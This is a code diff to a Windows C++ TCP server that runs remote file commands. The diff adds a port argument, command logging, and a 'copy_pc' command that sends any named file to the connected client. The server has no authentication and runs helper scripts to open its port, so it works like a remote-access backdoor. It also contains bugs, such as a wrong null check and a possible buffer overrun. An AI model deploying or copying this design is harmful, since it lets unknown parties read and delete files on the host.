@@ -15,7 +15,7 @@ cp - Copy files or directories.
 find - Search for files in a directory hierarchy.
 grep - Search text using patterns.
 exit - Exit the shell. //
-copy_pc - copy's a file to the client pc
+copy_pc - copy's a file to the client pc //
 */
 
 #include <windows.h>
@@ -42,6 +42,7 @@ int handleMakeDirectoryCommand(SOCKET socket, char *path);
 int handleTouchFileCommand(SOCKET clientSocket, char *fileName);
 int handleRemoveDirectoryCommand(SOCKET socket, char *path);
 int handleRemoveFileCommand(SOCKET clientSocket, char *fileName);
+int handleCopyCommand(SOCKET clientSocket, char *fileName);
 
 // Error function
 void handleError(SOCKET clientSocket, const char *command);
@@ -49,15 +50,29 @@ void handleError(SOCKET clientSocket, const char *command);
 // Misc functions
 int shiftStrLeft(char *str, int num);
 
-int __cdecl main()
+std::ofstream log("log.txt");
+
+int __cdecl main(int argc, char **argv)
 {
+    std::string port;
+    if(argc == 2)
+        port = argv[1];
+    else
+        port = DEFAULT_PORT;
+
     // Creates helper scripts
-    if(create_scripts(DEFAULT_PORT) != 0)
+    if(create_scripts(port.c_str()) != 0) {
+        log << "Failed to create scripts" << std::endl;
+        log.close();
         return 1;
+    }
 
     // Opens the default port
-    if(run_init() != 0)
+    if(run_init() != 0) {
+        log << "Failed to run scripts" << std::endl;
+        log.close();
         return 1;
+    }
 
     // Setup
     WSADATA wsaData;
@@ -74,6 +89,8 @@ int __cdecl main()
     iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
     if(iResult != 0) {
         fprintf(stderr, "WSAStartup failed with error: %d\n", iResult);
+        log << "WSAStartup failed with error: " << iResult << std::endl;
+        log.close();
         return 1;
     }
 
@@ -85,9 +102,11 @@ int __cdecl main()
     hints.ai_flags = AI_PASSIVE;
 
     // Resolve the server address and port
-    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
+    iResult = getaddrinfo(NULL, port.c_str(), &hints, &result);
     if(iResult != 0) {
         fprintf(stderr, "getaddrinfo failed with error: %d\n", iResult);
+        log << "getaddrinfo failed with error: " << iResult << std::endl;
+        log.close();
         WSACleanup();
         return 1;
     }
@@ -96,6 +115,8 @@ int __cdecl main()
     ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
     if(ListenSocket == INVALID_SOCKET) {
         fprintf(stderr, "socket failed with error: %d\n", WSAGetLastError());
+        log << "socket failed with error: " << WSAGetLastError() << std::endl;
+        log.close();
         freeaddrinfo(result);
         WSACleanup();
         return 1;
@@ -105,6 +126,8 @@ int __cdecl main()
     iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
     if(iResult == SOCKET_ERROR) {
         fprintf(stderr, "bind failed with error: %d", WSAGetLastError());
+        log << "bind failed with error: " << WSAGetLastError() << std::endl;
+        log.close();
         freeaddrinfo(result);
         closesocket(ListenSocket);
         WSACleanup();
@@ -116,6 +139,8 @@ int __cdecl main()
     iResult = listen(ListenSocket, SOMAXCONN);
     if(iResult == SOCKET_ERROR) {
         fprintf(stderr, "listen failed with error: %d", WSAGetLastError());
+        log << "listen failed with error: " << WSAGetLastError() << std::endl;
+        log.close();
         closesocket(ListenSocket);
         WSACleanup();
         return 1;
@@ -125,6 +150,8 @@ int __cdecl main()
     ClientSocket = accept(ListenSocket, NULL, NULL);
     if(ClientSocket == INVALID_SOCKET) {
         fprintf(stderr, "accept failed with error: %d", WSAGetLastError());
+        log << "accept failed with error: " << WSAGetLastError() << std::endl;
+        log.close();
         closesocket(ListenSocket);
         WSACleanup();
         return 1;
@@ -135,6 +162,7 @@ int __cdecl main()
     do {
         memset(recvbuf, 0, sizeof(recvbuf));
         iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+        log << recvbuf << std::endl;
 
         if (iResult > 0) {
             recvbuf[iResult] = '\0';
@@ -142,18 +170,21 @@ int __cdecl main()
             if (strcmp(recvbuf, "pwd") == 0) {
                 printf("%s\n", recvbuf);
                 if (handlePwdCommand(ClientSocket) == -1) {
+                    log << "FAILURE!" << std::endl;
                     handleError(ClientSocket, "pwd");
                     return 1;
                 }
             }
             else if(strcmp(recvbuf, "exit") == 0) {
                 printf("%s\n", recvbuf);
+                log << "exiting..." << std::endl;
                 handleExitCommand(ClientSocket);
                 return 0;
             }
             else if (strncmp(recvbuf, "cd ", 3) == 0) {
                 printf("%s\n", recvbuf);
                 if (handleChangeDirectoryCommand(ClientSocket, recvbuf + 3) == -1) {
+                    log << "FAILURE!" << std::endl;
                     handleError(ClientSocket, "cd");
                     return 1;
                 }
@@ -161,6 +192,7 @@ int __cdecl main()
             else if (strncmp(recvbuf, "ls", 2) == 0) {
                 printf("%s\n", recvbuf);
                 if (handleLsCommand(ClientSocket, recvbuf) == -1) {
+                    log << "FAILURE!" << std::endl;
                     handleError(ClientSocket, "ls");
                     return 1;
                 }
@@ -168,6 +200,7 @@ int __cdecl main()
             else if(strncmp(recvbuf, "mkdir ", 6) == 0) {
                 printf("%s\n", recvbuf);
                 if(handleMakeDirectoryCommand(ClientSocket, recvbuf) == -1) {
+                    log << "FAILURE!" << std::endl;
                     handleError(ClientSocket, "mkdir");
                     return 1;
                 }
@@ -175,6 +208,7 @@ int __cdecl main()
             else if(strncmp(recvbuf, "rmdir ", 6) == 0) {
                 printf("%s\n", recvbuf);
                 if(handleRemoveDirectoryCommand(ClientSocket, recvbuf) == -1) {
+                    log << "FAILURE!" << std::endl;
                     handleError(ClientSocket, "rmdir");
                     return 1;
                 }
@@ -182,6 +216,7 @@ int __cdecl main()
             else if(strncmp(recvbuf, "touch ", 6) == 0) {
                 printf("%s\n", recvbuf);
                 if(handleTouchFileCommand(ClientSocket, recvbuf) == -1) {
+                    log << "FAILURE!" << std::endl;
                     handleError(ClientSocket, "touch");
                     return 1;
                 }
@@ -189,18 +224,29 @@ int __cdecl main()
             else if(strncmp(recvbuf, "rm ", 3) == 0) {
                 printf("%s\n", recvbuf);
                 if(handleRemoveFileCommand(ClientSocket, recvbuf) == -1) {
+                    log << "FAILURE!" << std::endl;
                     handleError(ClientSocket, "rm");
                     return 1;
                 }
             }
-
+            else if(strncmp(recvbuf, "copy_pc ", 8) == 0) {
+                printf("%s\n", recvbuf);
+                if(handleCopyCommand(ClientSocket, recvbuf) == -1) {
+                    log << "FAILURE!" << std::endl;
+                    handleError(ClientSocket, "copy_pc");
+                    return 1;
+                }
+            }
 
             else {
+                log << "command does not exits" << std::endl;
                 sendCmdDoesntExist(ClientSocket);
             }
         }
         else if(iResult < 0) {
             fprintf(stderr, "recv failed with error: %d\n", WSAGetLastError());
+            log << "recv failed with error: " << WSAGetLastError() << std::endl;
+            log.close();
             closesocket(ClientSocket);
             WSACleanup();
             return 1;
@@ -210,15 +256,43 @@ int __cdecl main()
     iResult = shutdown(ClientSocket, SD_SEND);
     if(iResult == SOCKET_ERROR) {
         fprintf(stderr, "shutdown failed with error: %d\n", WSAGetLastError());
+        log << "shutdown failed with error: " << WSAGetLastError() << std::endl;
+        log.close();
         closesocket(ClientSocket);
         WSACleanup();
         return 1;
     }
 
     // Cleanup
+    log.close();
     closesocket(ClientSocket);
     WSACleanup();
 
+    return 0;
+}
+
+int handleCopyCommand(SOCKET clientSocket, char *fileName) {
+    shiftStrLeft(fileName, 8);
+
+    std::ifstream input(fileName);
+    if(!fileName)
+        return -1;
+
+    std::string file_contents = "\v\v";
+    char c;
+    while(input.get(c))
+        file_contents += c;
+
+    file_contents += '\f';
+    int iSendResult = send(clientSocket, file_contents.c_str(), (int) file_contents.length(), 0);
+    if(iSendResult == SOCKET_ERROR) {
+        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+        input.close();
+        return -1;
+    }
+
+    input.close();
+    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -243,7 +317,9 @@ int handleRemoveFileCommand(SOCKET clientSocket, char *fileName) {
         fprintf(stderr, "Error removing file: %s\n", e.what());
         return -1;
     }
-    return 1;
+
+    log << "SUCCESS!" << std::endl;
+    return 0;
 }
 
 int handleTouchFileCommand(SOCKET clientSocket, char *fileName) {
@@ -265,6 +341,7 @@ int handleTouchFileCommand(SOCKET clientSocket, char *fileName) {
     }
 
     file.close();
+    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -286,7 +363,9 @@ int handleRemoveDirectoryCommand(SOCKET clientSocket, char *path) {
         fprintf(stderr, "Error removing directory: %s\n", e.message().c_str());
         return -1;
     }
-    return 1;
+
+    log << "SUCCESS!" << std::endl;
+    return 0;
 }
 
 int handleMakeDirectoryCommand(SOCKET clientSocket, char *path) {
@@ -301,6 +380,8 @@ int handleMakeDirectoryCommand(SOCKET clientSocket, char *path) {
             fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
             return -1;
         }
+
+        log << "SUCCESS!" << std::endl;
         return 0;
     }
     else
@@ -318,6 +399,7 @@ int handlePwdCommand(SOCKET clientSocket) {
         return -1;
     }
 
+    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -344,6 +426,7 @@ int handleChangeDirectoryCommand(SOCKET clientSocket, const char* path) {
             return -1;
         }
 
+        log << "SUCCESS!" << std::endl;
         return 0;
     }
     catch (const std::filesystem::filesystem_error& e) {
@@ -356,6 +439,7 @@ int handleChangeDirectoryCommand(SOCKET clientSocket, const char* path) {
             return -1;
         }
 
+        log << "SUCCESS!" << std::endl;
         return 0;
     }
 }
@@ -398,6 +482,7 @@ int handleLsCommand(SOCKET clientSocket, char *command) {
         if(thisDirectory)
             std::filesystem::current_path(prevDirectory);
 
+        log << "SUCCESS!" << std::endl;
         return 0;
 
     } catch (const std::exception& e) {
@@ -410,6 +495,7 @@ int handleLsCommand(SOCKET clientSocket, char *command) {
             return -1;
         }
 
+        log << "SUCCESS!" << std::endl;
         return 0;
     }
 }
